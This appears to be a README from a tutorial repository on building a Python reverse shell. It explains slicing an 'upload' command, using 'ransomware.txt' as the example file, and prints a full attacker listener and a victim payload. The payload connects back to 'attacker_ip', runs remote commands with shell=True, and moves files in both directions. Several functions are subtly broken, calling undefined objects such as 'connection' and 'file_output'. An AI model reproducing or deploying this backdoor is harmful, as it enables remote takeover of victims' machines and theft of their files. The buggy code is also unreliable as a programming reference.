<h2 align="center">Upload Functionality</h2>
<p align="center"><img width="350" height="350" src="./src/banner_cnph.gif"></p>

Upload command is the opposite of download command

command : `upload ransomware.txt`

If the command is starting from zero index

`cmd[0:`

Slice into two parts, first part starts with `U`  in `upload`</br>
which will be at the zero index up to the exclusion position

`cmd[0:6] -> upload`

You can start with initial index since the zero is optional

`cmd[:6] -> upload`

The [6:7] index would be the whitespace inbetween the two slice</br>
Second part starts with [7] index till last index

`cmd[7:] -> ransomware.txt`

- - - - - - - - - - - - - - - - - - - - - -
> [listener.py](listener.py)
```python
import socket
import subprocess

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

listener.bind(("attacker_ip", 1337))

listener.listen()

print("Server has started")

connection, address = listener.accept()

# Send the data to the client on a victims' machine
# Add send_data() function same as the one in payload.py
def send_data(ouput_data):
    size_of_data = len(ouput_data)             # cannot directly send any file
    size_of_data = str(size_of_data)           # need to convert it into bytes
    payload.send(bytes(size_of_data, "utf-8")) # send the data in form of bytes
    payload.send(ouput_data)

def recv_data():
    original_size = connection.recv(2048).decode("utf-8")
    original_size = int(original_size)
    
    data = connection.recv(2048)
    while len(data) != original_size:
        data = data + connection.recv(2048)
    return data

while True:
	try: 
		cmd = input("enter a command: ")
		
		if cmd == "quit":
			connection.send(b"quit")
			connection.close()
			break

		elif cmd[:2] == "cd":
			connection.send(bytes(cmd, "utf-8"))
			recv = recv_data()
			print(recv.decode("utf-8"))
			continue

		elif cmd[:8] == "download":
			connection.send(bytes(cmd, "utf-8"))

			file_output = recv_data()
			if file_output == b"No file found":
				print(file_output.decode("utf-8"))
				continue

			with open(f'{cmd[9:]}', 'wb') as write_data:
				write_data.write(file_output)
				write_data.close()
			continue 

		# Add new command with the first 6 letter 'upload'
		elif cmd[:6] == "upload":
			# File name start with [7:] index
			# Open a file that is needed to upload with open() functionality
			# Read the file from client and send to server with 'rb' for read binary
			with open(f'{cmd[7:]}', 'rb') as data: # Read as data
				file_data = data.read() # Call the read() function to read file data
				data.close() # Close the file after reading
			# Pass the file to send the data
			send_data(file_data)
			continue 
			
		connection.send(bytes(cmd, "utf-8"))
		
		output = recv_data()
		print(output.decode("utf-8"))
	
	except FileNotFoundError:
		print("File Not Found")
		send_data(b"Error")
	except subprocess.CalledProcessError:
		send_data(b"Wrong command")

print("Server has stopped")
```

> [payload.py](payload.py)
```python
import socket
import subprocess

import os

payload = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

payload.connect(("attacker_ip", 1337))

print("Connected")

def send_data(ouput_data):
    size_of_data = len(ouput_data)
    size_of_data = str(size_of_data)
    payload.send(bytes(size_of_data, "utf-8"))
    payload.send(ouput_data)

# Receive data from the server
# Add recv_data() function same as the one in listener.py
def recv_data():
    original_size = connection.recv(2048).decode("utf-8")
    original_size = int(original_size)
    
    data = connection.recv(2048)
    while len(data) != original_size:
        data = data + connection.recv(2048)
    return data
 
while True:
	try: 
		cmd = payload.recv(2048)
		cmd = cmd.decode("utf-8")
		
		if cmd == "quit":
			payload.close()
			break
		
		elif cmd[:2] == "cd":
			os.chdir(cmd[3:])
			
			send_data(b"Changed directory")
			continue

		elif cmd[:8] == "download":
			with open(f'{cmd[9:]}', 'rb') as data:
				data_read = data.read()
				data.close()

				send_data(data_read)
				continue
		
		# Add new command with the first 6 letter 'upload'
		elif cmd[:6] == "upload":
			# Receive the data that is sent from server
			data = recv_data() # Data received will be in bytes
			# Check if the data has any error
			if data == b"Error":
				continue
			# Otherwise, we upload or copy the content of data we receive
			with open(f'{cmd[7:]}', 'wb') as write_data: # Create a new file in write mode
				write_data.write(file_output) # Paste the contents of data in bytes
				write_data.close()
			continue 

		output = subprocess.check_output(cmd, shell = True)

		send_data(output)

	except FileNotFoundError:
		print("File Not Found")
		send_data(b"Error")
	except subprocess.CalledProcessError:
		send_data(b"Wrong command")

print("Disconnected")
```